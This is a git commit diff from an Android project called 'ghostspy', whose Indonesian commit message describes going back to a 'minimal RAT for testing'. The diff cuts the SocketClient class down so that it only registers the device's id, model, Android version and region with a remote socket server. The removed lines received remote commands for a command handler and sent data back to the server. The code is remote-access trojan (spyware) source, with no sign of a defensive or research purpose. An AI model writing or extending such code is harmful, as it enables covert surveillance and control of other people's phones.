d3ede625b64f38c9fb7963a19276c1778c853e2d
p6825954-coder <p6825964@gmail.com>
2026-06-28 05:37:17 +0700

    Kembali ke RAT minimal untuk tes

--- app/src/main/java/com/ghostspy/SocketClient.java
+++ app/src/main/java/com/ghostspy/SocketClient.java
@@ -9,11 +9,9 @@ import java.net.URISyntaxException;
 public class SocketClient {
     private Socket socket;
     private String deviceId;
-    private CommandHandler handler;
 
     public SocketClient(String id) {
         this.deviceId = id;
-        handler = new CommandHandler();
         try {
             IO.Options opts = new IO.Options();
             opts.transports = new String[]{"polling"};
@@ -27,34 +25,13 @@ public class SocketClient {
             JSONObject reg = new JSONObject();
             try {
                 reg.put("id", deviceId);
-                reg.put("ip", GhostService.getLocalIp());
+                reg.put("ip", "minimal");
                 reg.put("model", android.os.Build.MODEL);
                 reg.put("android", android.os.Build.VERSION.RELEASE);
                 reg.put("region", java.util.Locale.getDefault().getCountry());
                 socket.emit("register", reg);
             } catch (Exception e) {}
         });
-        socket.on("command", args -> {
-            try {
-                JSONObject cmd = (JSONObject) args[0];
-                handler.handle(cmd.getString("command"), cmd.optJSONObject("params"));
-            } catch (Exception e) {}
-        });
         socket.connect();
-    }
-
-    public void send(String type, String payload) {
-        if (socket != null && socket.connected()) {
-            JSONObject msg = new JSONObject();
-            try {
-                msg.put("type", type);
-                msg.put("payload", payload);
-                socket.emit("data", msg);
-            } catch (Exception e) {}
-        }
-    }
-
-    public void disconnect() {
-        if (socket != null) socket.disconnect();
     }
 }
